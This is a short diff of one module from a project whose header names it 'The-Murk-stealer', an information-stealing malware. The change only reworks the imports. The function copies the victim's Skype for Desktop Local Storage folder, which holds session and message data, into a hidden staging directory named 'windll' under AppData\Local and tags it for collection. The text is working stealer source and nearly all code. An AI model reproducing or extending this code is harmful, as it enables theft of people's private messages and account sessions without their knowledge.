@@ -9,18 +9,18 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import shutil
-import os
+from shutil import copytree
+from os import makedirs,sep,environ
 
 def skype(data):
-    mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+    mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
     path1 = r"\Microsoft\Skype for Desktop\Local Storage"
     try:
         try:
-            os.makedirs(rf'{mainPath}\windll\Messengers\Skype')
+            makedirs(rf'{mainPath}\windll\Messengers\Skype')
         except:
             pass
-        shutil.copytree(rf"{mainPath}{path1}",rf"{mainPath}\windll\Messengers\Skype")# copy dir
+        copytree(rf"{mainPath}{path1}",rf"{mainPath}\windll\Messengers\Skype")# copy dir
         data.append("\n∟📨Skype")
         return data
     except:
